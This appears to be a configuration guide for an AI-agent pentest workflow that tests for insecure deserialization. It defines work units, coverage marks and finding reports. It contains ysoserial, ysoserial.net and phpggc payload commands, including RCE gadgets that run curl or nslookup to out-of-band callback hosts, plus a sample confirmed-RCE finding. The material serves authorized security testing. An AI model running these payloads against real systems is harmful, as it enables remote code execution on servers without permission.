# rupu wiring for deserialization-testing

Every parse/handoff step ends in one of: a **work-units JSON array**,
**`assets.mark`** calls, or a **`findings.report`** call.

## 1. Work units (fan-out over discovered sinks)

`scripts/detect_serialized.py scan --work-units deser-units.json` writes a
clean JSON array whose **first character is `[`** — a rupu workflow
`for_each:` JSON-parses the file (read via `read_file`), and a lead agent
`dispatch`es one child per element. Normalize/split with the `work-units`
skill before fan-out. One unit per distinct (URL, location, format):

```json
[
  {
    "id": "deser-example-com-account-cookie-session-java",
    "title": "Java serialized object in cookie 'session' at https://example.com/account",
    "targets": ["https://example.com/account"],
    "hints": {
      "location": "cookie:session",
      "format": "java-serialized",
      "encoding": "base64",
      "sample_prefix": "rO0ABXNyAB...",
      "suggested_tool": "ysoserial",
      "first_probe": "java -jar ysoserial.jar URLDNS 'http://java-<id>.oast.pro/' | base64 -w0",
      "gadget_order": "URLDNS,CommonsCollections6,CommonsCollections5,CommonsBeanutils1,CommonsCollections2,Spring1,ROME",
      "reference": "java.md"
    }
  },
  {
    "id": "deser-example-net-login-param-viewstate-dotnet",
    "title": ".NET LosFormatter blob in __VIEWSTATE at https://example.net/login.aspx",
    "targets": ["https://example.net/login.aspx"],
    "hints": {
      "location": "param:__VIEWSTATE",
      "format": "dotnet-viewstate",
      "encoding": "base64",
      "suggested_tool": "ysoserial.net",
      "first_probe": "flip one byte -> MAC error? then hunt machineKey; ysoserial.exe -p ViewState ...",
      "reference": "dotnet-php-python.md"
    }
  },
  {
    "id": "deser-example-com-profile-cookie-prefs-php",
    "title": "PHP serialized object in cookie 'prefs' at https://example.com/profile",
    "targets": ["https://example.com/profile"],
    "hints": {
      "location": "cookie:prefs",
      "format": "php-serialized",
      "encoding": "base64",
      "suggested_tool": "phpggc",
      "first_probe": "phpggc -b -f Monolog/RCE1 system 'curl http://php-<id>.oast.pro'",
      "reference": "dotnet-php-python.md"
    }
  }
]
```

Rules: `id` lowercase/hyphenated, unique, derived from host+path+location+format;
`targets` concrete URLs; `hints` must let a child agent attack without
re-scanning (format, encoding chain, tool, ordered probe plan).

## 2. Coverage — `assets.mark` (see the `coverage-assets` skill)

`web` profile kinds, `web:` prefix. Depth ladder `mapped → crawled → tested →
exploited`; mark the rung actually reached: sink discovered by traffic
inspection = `crawled`; payloads delivered = `tested`; callback/RCE =
`exploited`.

```json
{"kind": "web:site", "coordinates": [{"t": "url", "v": "https://example.com"}], "label": "https://example.com", "depth": "mapped"}
```

```json
{"kind": "web:route", "coordinates": [{"t": "url", "v": "https://example.com"}, {"t": "http_route", "v": "/account"}, {"t": "param", "v": "session"}], "label": "cookie 'session' — Java serialized blob (deser sink)", "depth": "crawled"}
```

```json
{"kind": "web:route", "coordinates": [{"t": "url", "v": "https://example.com"}, {"t": "http_route", "v": "/account"}, {"t": "param", "v": "session"}], "label": "cookie 'session' — ysoserial CC6 RCE confirmed", "depth": "exploited"}
```

## 3. Findings — `findings.report` (see the `finding-report` skill)

Scope `endpoint` pinned to the sink URL (scope `host` only for host-wide seats
like an exposed RMI registry). Include the HTTP exchange in evidence and an
OWASP/CWE classification — the `web` profile completeness checks require the
route pin, the exchange, and the classification. Severity `critical` for
confirmed execution/callback; `high` for a proven parse-oracle without a
working gadget yet.

Build it with the script:

```
python3 scripts/detect_serialized.py report \
  --url https://example.com/account --location cookie:session --format java-serialized \
  --tool "ysoserial CommonsCollections6" \
  --payload-cmd "java -jar ysoserial.jar CommonsCollections6 'nslookup cc6-x9k2.oast.pro' | base64 -w0" \
  --request-file delivery-req.txt --response-file oast-hit.json \
  -o finding.json
```

Resulting shape:

```json
{
  "title": "Insecure Java deserialization in 'session' cookie — RCE via CommonsCollections6",
  "scope": "endpoint",
  "target_ref": "https://example.com/account",
  "severity": "critical",
  "classification": ["WSTG-INPV-19", "CWE-502"],
  "evidence": {
    "rationale": "The 'session' cookie contains a base64 Java serialized object (rO0AB / 0xACED0005) that the server passes to ObjectInputStream.readObject(). A ysoserial URLDNS payload produced a DNS callback to x9k2.oast.pro, confirming the sink; a CommonsCollections6 payload (commons-collections 3.1 identified from stack traces) executed `nslookup cc6-x9k2.oast.pro`, producing the correlated interactsh DNS hit below — arbitrary OS command execution.",
    "request": "GET /account HTTP/1.1\r\nHost: example.com\r\nCookie: session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldL...\r\n\r\n",
    "response": "HTTP/1.1 200 OK ...\n--- interactsh ---\n{\"protocol\":\"dns\",\"full-id\":\"cc6-x9k2.oast.pro\",\"remote-address\":\"203.0.113.7\",\"timestamp\":\"...\"}"
  }
}
```

For parse-oracle-only findings set `severity: high` and make `rationale` show
the byte-flip differential (original blob → 200; corrupted blob →
`java.io.StreamCorruptedException` 500), with both exchanges in evidence.

## 4. Step → output map

| Methodology step | rupu output |
|---|---|
| Traffic/cookie scan parsed (`detect_serialized.py scan`) | work-units array → `work-units` skill |
| Each discovered sink | `assets.mark` web:route `depth=crawled` |
| URLDNS / byte-flip oracle sent | `assets.mark depth=tested`; update unit hints |
| Callback / RCE confirmed | `assets.mark depth=exploited` + `findings.report` (`report` subcommand) |
